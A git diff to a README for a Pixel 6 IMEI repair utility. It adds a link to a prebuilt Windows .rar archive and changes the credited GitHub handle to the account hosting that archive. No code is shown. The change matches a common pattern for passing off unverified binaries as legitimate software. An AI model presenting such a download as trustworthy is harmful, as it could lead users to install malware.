@@ -273,13 +273,19 @@ The main goals of the project are:
 * Maintain a clean and professional interface
 * Make technical repair steps easier to understand
 
+## 📥 Download
+
+Download the latest Windows build here:
+
+[Download Pixel 6 Series IMEI Repair Utility](https://github.com/zainaamir384/Pixel-6-Series-IMEI-Repair/releases/download/imei-repair/Pixel.6.Series.IMEI.Repair.Utility.rar)
+
 ---
 
 ## 👨‍💻 Developer
 
 **Application redesign, current build, interface, documentation, and ongoing maintenance by Zain Aamir.**
 
-GitHub: `@zainaamir516`
+GitHub: `@zainaamir384`
 
 © 2026 Zain Aamir
 
